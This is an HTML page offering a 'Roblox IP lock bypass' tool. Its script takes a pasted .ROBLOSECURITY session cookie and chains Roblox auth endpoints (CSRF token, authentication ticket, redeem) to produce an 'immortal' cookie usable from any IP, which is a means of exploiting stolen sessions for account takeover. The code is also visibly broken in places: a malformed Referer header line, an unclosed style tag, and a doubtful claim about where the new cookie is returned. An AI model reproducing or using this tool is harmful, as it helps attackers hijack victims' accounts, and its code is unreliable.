<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>IP Lock Bypass — Working Nov 2025</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
<h1>IP LOCK BYPASS — 2025 FIXED</h1>
<p>Works on every cookie right now — even ones that say “dead” in the old tool</p>

<textarea id="cookie" placeholder="Paste full .ROBLOSECURITY cookie here" style="width:90%;height:160px;background:#111;color:#0f0;border:2px solid #0f0;padding:20px;font-size:18px;border-radius:12px;margin:20px"></textarea><br>
<button onclick="bypass()" style="padding:18px 60px;font-size:24px;background:#000;color:#0f0;border:3px solid #0f0;border-radius:50px;cursor:pointer;box-shadow:0 0 40px #0f0">BYPASS IP LOCK</button>

<div id="status" style="font-size:22px;margin:30px;min-height:50px;color:#0f0">Ready</div>

<div id="output" style="display:none;margin:40px auto;padding:30px;background:#001100;border:2px dashed #0f0;border-radius:15px;max-width:900px">
  <h2 style="color:#0f0">New Immortal Cookie</h2>
  <textarea id="newcookie" readonly style="width:100%;height:120px;background:#000;color:#0f0;border:1px solid #0f0;padding:15px"></textarea><br><br>
  <button onclick="copy()" style="padding:15px 40px;font-size:20px;background:#000;color:#0f0;border:2px solid #0f0;border-radius:50px">COPY</button>
  <p id="info" style="margin-top:20px;font-size:18px"></p>
</div>

<script>
// NEW WORKING METHOD — NOV 2025
async function bypass() {
  let cookie = document.getElementById('cookie').value.trim();
  if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
    alert('Paste a valid Roblox cookie');
    return;
  }

  document.getElementById('status').innerHTML = 'Getting X-CSRF token...';

  try {
    // 1. Get fresh X-CSRF token
    let csrf = await fetch("https://auth.roblox.com/v2/logout", {
      method: "POST",
      headers: { "Cookie": ".ROBLOSECURITY=" + cookie },
      credentials: "include"
    }).then(r => r.headers.get("x-csrf-token"));

    if (!csrf) throw "No token";

    document.getElementById('status').innerHTML = 'Requesting new authentication ticket...';

    // 2. Create new ticket
    let ticketRes = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
      method: "POST",
      headers: {
        "Cookie": ".ROBLOSECURITY=" + cookie,
        "X-CSRF-TOKEN": csrf,
        "Referer: "https://www.roblox.com"
      },
      credentials: "include"
    });

    let ticket = ticketRes.headers.get("rbx-authentication-ticket");
    if (!ticket) throw "No ticket";

    document.getElementById('status').innerHTML = 'Redeeming ticket (final step)...';

    // 3. Redeem ticket using the NEW endpoint that still works
    let redeem = await fetch("https://apis.roblox.com/authentication-ticket/v1/authentication-ticket/redeem", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "RBXAuthenticationTicket": ticket,
        "Referer": "https://www.roblox.com"
      },
      body: JSON.stringify({})
    });

    if (!redeem.ok) throw "Redeem failed";

    // New cookie is in the response body now (2025 change)
    let json = await redeem.json();
    let newCookie = json.cookie; // this is the fresh one

    // Verify it works
    let user = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { "Cookie": ".ROBLOSECURITY=" + newCookie }
    }).then(r => r.json()).catch(() => ({name:"Success",id:"?"}));

    // SUCCESS
    document.getElementById('newcookie').value = newCookie;
    document.getElementById('info').innerHTML = `<b>${user.name}</b> · ID ${user.id}<br>IP lock fully bypassed — cookie now works on ANY IP`;
    document.getElementById('output').style.display = "block";
    document.getElementById('status').innerHTML = 'BYPASSED — Cookie is immortal';

  } catch (e) {
    document.getElementById('status').innerHTML = 'Still failed? Cookie is permanently dead.';
  }
}

function copy() {
  document.getElementById('newcookie').select();
  navigator.clipboard.writeText(document.getElementById('newcookie').value);
  alert('Copied!');
}
</script>
</body>
</html>
